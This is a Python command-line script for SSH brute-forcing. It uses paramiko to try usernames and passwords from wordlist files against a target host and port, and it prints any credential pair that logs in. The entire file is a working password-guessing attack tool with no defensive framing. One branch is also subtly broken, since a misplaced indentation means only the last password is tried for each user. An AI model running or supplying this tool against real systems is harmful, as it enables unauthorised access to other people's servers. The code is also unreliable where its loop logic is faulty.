import os
import argparse
import paramiko

def ssh_bruteforce(host, port, userfile, passfile, user=None, password=None):
    try:
        if passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for password in passwords:
                password = password.strip()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(host, port, user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except paramiko.AuthenticationException:
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and password:
            with open(userfile, 'r') as f:
                users = f.readlines()
            for user in users:
                user = user.strip()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(host, port, user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except paramiko.AuthenticationException:
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(host, port, user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except paramiko.AuthenticationException:
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        else:
            print('\033[91m [-]\033[0m Please provide both username and password files')
            exit(1)
        
    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)
def main():
    parser = argparse.ArgumentParser(description='SSH Bruteforce')
    parser.add_argument('-u','--user',type=str,required=False, help='Username')
    parser.add_argument('-p','--password',type=str,required=False, help='Password')
    parser.add_argument('-U','--userfile',type=argparse.FileType('r'),required=False, help='User file')
    parser.add_argument('-P','--passwordfile',type=argparse.FileType('r'), help='Password')
    parser.add_argument('-host',type=str, help='Host')
    parser.add_argument('-port',type=int,default=22, help='Port')

    args = parser.parse_args()

    if args.userfile:
        userfile = args.userfile.name
    else:
        userfile = None
    
    if args.passwordfile:
        passfile = args.passwordfile.name
    else:
        passfile = None

    ssh_bruteforce(args.host, args.port, userfile, passfile, args.user, args.password)

if __name__ == '__main__':
    main()


